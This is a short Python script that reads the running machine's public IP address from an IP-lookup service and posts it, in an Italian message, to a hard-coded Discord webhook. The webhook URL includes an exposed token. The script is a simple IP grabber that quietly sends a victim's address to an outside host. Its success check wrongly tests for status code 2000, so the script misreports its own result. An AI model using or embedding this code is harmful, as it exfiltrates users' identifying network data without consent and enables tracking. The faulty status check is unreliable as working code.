import requests
ip = requests.get("https://api.ipify.org").text
payload = {
       "content" : f"L'indirizzo ip è {ip}"
}
response = requests.post("https://discord.com/api/webhooks/1181887539720749108/JGzvwv4hUWfn4HQapBSD2LMimd6hD2rx9AV95S_PDPCNHWtkDoxPmrt70b1s8wj4Ok18" , json=payload)
if response.status_code == 2000:
    print("Ez")
else:    
    print("No ez")